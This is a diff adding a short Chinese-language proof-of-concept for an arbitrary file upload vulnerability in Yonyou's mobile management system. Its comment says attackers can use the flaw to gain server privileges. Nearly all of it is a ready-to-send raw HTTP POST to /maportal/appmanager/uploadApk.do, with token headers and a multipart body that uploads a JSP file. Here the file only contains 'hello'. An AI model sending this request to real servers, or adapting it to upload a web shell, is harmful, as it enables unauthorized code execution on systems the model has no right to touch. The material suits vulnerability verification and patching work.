@@ -1,0 +1,16 @@
+# 用友 移动管理系统 uploadApk.do 任意文件上传漏洞
+# 用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
+POST /maportal/appmanager/uploadApk.do?pk_obj=&acid=80015003&bid=hd_tag_m8mv2469 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2469
+RM-PRO-Token: 841b53a3579d13ab3aaa750eaa12afe5
+RM-PRO-Time: 1742808365732
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
+Content-Type: application/msword
+
+hello
+------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
